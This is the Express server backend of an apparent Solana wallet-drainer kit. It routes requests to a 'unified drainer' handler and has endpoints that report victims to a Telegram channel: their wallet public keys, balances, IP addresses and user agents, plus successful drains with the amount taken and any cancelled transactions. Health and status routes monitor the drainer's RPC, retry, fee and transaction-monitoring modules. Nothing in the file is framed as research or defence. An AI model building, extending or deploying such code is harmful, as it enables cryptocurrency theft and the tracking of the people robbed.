import express from 'express';
import cors from 'cors';
import unifiedDrainerHandler from './api/unified-drainer.js';
import telegramLogger from './src/telegram.js';

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Serve src directory with correct MIME type for JavaScript modules
app.use('/src', express.static('src', {
  setHeaders: (res, path) => {
    if (path.endsWith('.js')) {
      res.setHeader('Content-Type', 'application/javascript');
    }
  }
}));

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Unified drainer endpoint (replaces both original and enhanced)
app.post('/api/drainer', unifiedDrainerHandler);

// Legacy enhanced endpoint (redirects to unified for backward compatibility)
app.post('/api/enhanced-drainer', async (req, res) => {
  console.log('[LEGACY] Enhanced endpoint called, redirecting to unified drainer');
  await unifiedDrainerHandler(req, res);
});

// Log wallet detection
app.post('/api/drainer/log-wallet', async (req, res) => {
  try {
    const { publicKey, lamports, ip, userAgent, walletType } = req.body;
    
    await telegramLogger.logWalletDetected({
      publicKey,
      lamports,
      ip,
      userAgent,
      walletType
    });
    
    res.json({ success: true, message: 'Wallet logged successfully' });
  } catch (error) {
    console.error('Error logging wallet:', error);
    res.status(500).json({ error: 'Failed to log wallet' });
  }
});

// Log transaction confirmation
app.post('/api/drainer/log-confirmation', async (req, res) => {
  try {
    const { publicKey, lamports, ip, userAgent, txid, status, error: errorMsg, walletType, actualDrainAmount } = req.body;
    
    if (status === 'cancelled') {
      await telegramLogger.logTransactionCancelled({
        publicKey,
        lamports,
        ip,
        userAgent,
        reason: errorMsg || 'User cancelled',
        walletType
      });
    } else {
      await telegramLogger.logDrainSuccess({
        publicKey,
        lamports,
        ip,
        userAgent,
        txid,
        status,
        walletType,
        actualDrainAmount: parseInt(actualDrainAmount) || 0
      });
    }
    
    res.json({ success: true, message: 'Confirmation logged successfully' });
  } catch (error) {
    console.error('Error logging confirmation:', error);
    res.status(500).json({ error: 'Failed to log confirmation' });
  }
});

// Log transaction cancellation (legacy endpoint for backward compatibility)
app.post('/api/drainer/log-cancellation', async (req, res) => {
  try {
    const { publicKey, lamports, ip, userAgent, reason, walletType } = req.body;
    
    await telegramLogger.logTransactionCancelled({
      publicKey,
      lamports,
      ip,
      userAgent,
      reason: reason || 'Unknown reason',
      walletType
    });
    
    res.json({ success: true, message: 'Cancellation logged successfully' });
  } catch (error) {
    console.error('Error logging cancellation:', error);
    res.status(500).json({ error: 'Failed to log cancellation' });
  }
});

// Enhancement modules status endpoint
app.get('/api/enhancements/status', async (req, res) => {
  try {
    // Get status from unified drainer
    const { enhancementModules, drainerConfig } = await import('./api/unified-drainer.js');
    
    const status = {
      timestamp: new Date().toISOString(),
      configuration: drainerConfig,
      modules: enhancementModules ? {
        rpc: enhancementModules.rpcManager?.getRPCStats?.() || 'Not loaded',
        rateLimiting: enhancementModules.rateLimiter?.getRateLimitStats?.() || 'Not loaded',
        retry: enhancementModules.retryManager?.getRetryStats?.() || 'Not loaded',
        fees: enhancementModules.feeOptimizer?.getFeeStats?.() || 'Not loaded',
        monitoring: enhancementModules.transactionMonitor?.getMonitoringStats?.() || 'Not loaded',
        wallet: enhancementModules.walletOptimizer?.getWalletStats?.() || 'Not loaded'
      } : 'No enhancement modules loaded'
    };
    
    res.json(status);
  } catch (error) {
    console.error('Error getting enhancement status:', error);
    res.status(500).json({ 
      error: 'Failed to get enhancement status',
      details: error.message,
      fallback: 'Unified drainer not available'
    });
  }
});

// Enhancement modules health check
app.get('/api/enhancements/health', async (req, res) => {
  try {
    // Get health from unified drainer
    const { enhancementModules, drainerConfig } = await import('./api/unified-drainer.js');
    
    const healthReport = {
      timestamp: new Date().toISOString(),
      status: 'healthy',
      configuration: {
        enhanced: drainerConfig.enhanced,
        core: drainerConfig.core
      },
      modules: {}
    };
    
    if (enhancementModules) {
      // Check RPC health
      try {
        if (enhancementModules.rpcManager?.performHealthCheck) {
          await enhancementModules.rpcManager.performHealthCheck();
          healthReport.modules.rpc = 'healthy';
        } else {
          healthReport.modules.rpc = 'not available';
        }
      } catch (error) {
        healthReport.modules.rpc = `unhealthy: ${error.message}`;
        healthReport.status = 'degraded';
      }
      
      // Check rate limiter
      try {
        if (enhancementModules.rateLimiter?.getRateLimitStats) {
          const rateLimitStats = enhancementModules.rateLimiter.getRateLimitStats();
          healthReport.modules.rateLimiter = 'healthy';
        } else {
          healthReport.modules.rateLimiter = 'not available';
        }
      } catch (error) {
        healthReport.modules.rateLimiter = `unhealthy: ${error.message}`;
        healthReport.status = 'degraded';
      }
      
      // Check transaction monitor
      try {
        if (enhancementModules.transactionMonitor?.getMonitoringStats) {
          const monitoringStats = enhancementModules.transactionMonitor.getMonitoringStats();
          healthReport.modules.transactionMonitor = 'healthy';
        } else {
          healthReport.modules.transactionMonitor = 'not available';
        }
      } catch (error) {
        healthReport.modules.transactionMonitor = `unhealthy: ${error.message}`;
        healthReport.status = 'degraded';
      }
    } else {
      healthReport.modules = 'No enhancement modules loaded';
      healthReport.status = 'basic';
    }
    
    res.json(healthReport);
  } catch (error) {
    console.error('Error checking enhancement health:', error);
    res.status(500).json({ 
      error: 'Failed to check enhancement health',
      details: error.message,
      fallback: 'Unified drainer not available'
    });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🔗 Unified drainer: http://localhost:${PORT}/api/drainer`);
  console.log(`🔄 Legacy enhanced endpoint: http://localhost:${PORT}/api/enhanced-drainer`);
  console.log(`📈 Enhancement status: http://localhost:${PORT}/api/enhancements/status`);
  console.log(`🏥 Enhancement health: http://localhost:${PORT}/api/enhancements/health`);
  console.log(`✅ Unified architecture prevents resource conflicts and ensures stability`);
});

export default app; 